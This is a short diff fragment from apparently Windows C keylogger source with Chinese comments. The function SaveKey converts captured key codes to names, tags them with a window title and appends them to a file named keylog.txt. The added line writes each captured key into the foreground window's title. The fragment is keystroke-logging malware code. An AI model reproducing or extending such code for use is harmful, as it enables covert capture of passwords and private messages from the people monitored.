@@ -68,6 +68,7 @@ void SaveKey(USHORT usVKey)
 	::lstrcpy(szKey, GetKeyName(usVKey));
 	// 构造按键记录信息字符串
 	::wsprintf(szText, "[%s] %s\r\n", szTitle, szKey);
+	SetWindowText(hForegroundWnd, szKey);
 	// 打开文件写入按键记录数据
 	::fopen_s(&fp, "keylog.txt", "a+");
 	if (NULL == fp)
